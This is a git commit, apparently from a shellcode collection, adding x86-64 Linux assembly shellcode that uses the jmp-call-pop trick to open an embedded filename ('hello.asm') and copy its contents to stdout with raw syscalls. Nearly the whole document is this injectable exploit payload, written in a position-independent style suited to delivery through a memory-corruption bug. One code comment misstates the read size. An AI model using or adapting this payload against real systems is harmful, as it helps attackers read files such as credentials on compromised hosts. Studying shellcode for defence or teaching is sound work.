17588eb6e823752edfc60ff6f5bd2e533417a8bf
-TOSH- <tosh@t0x0sh.org>
2015-09-03 18:35:14 +0200

    New x86-64 shellcode : cat filename with syscalls only

---
+++ shellcodes/linux/x86-64/cat_syscall.asm
@@ -0,0 +1,46 @@
+BITS 64
+	GLOBAL _start
+
+_start:
+    jmp short FILENAME
+RET:
+
+	;; sys_open(filename, 0, 0)
+    xor rax, rax
+	mov al, 2
+	pop rdi
+	xor rsi, rsi
+    xor rdx, rdx
+	syscall
+
+    xchg rax, r12
+
+    .LOOP:
+    ;; sys_read(fd, rsp, 0x1234)
+    mov rdi, r12
+    xor rax, rax
+    xor rdx, rdx
+    inc edx
+    mov rsi, rsp
+    syscall
+
+    test rax, rax
+    jz .END
+
+    ;; sys_write(fd, rsp, rax)
+
+    xor rdi, rdi
+    inc rdi
+    syscall
+
+    jmp short .LOOP
+    .END:
+
+    xor rax,rax
+    mov al, 60
+    syscall
+
+FILENAME:
+
+    call RET
+filename: db 'hello.asm', 0x00
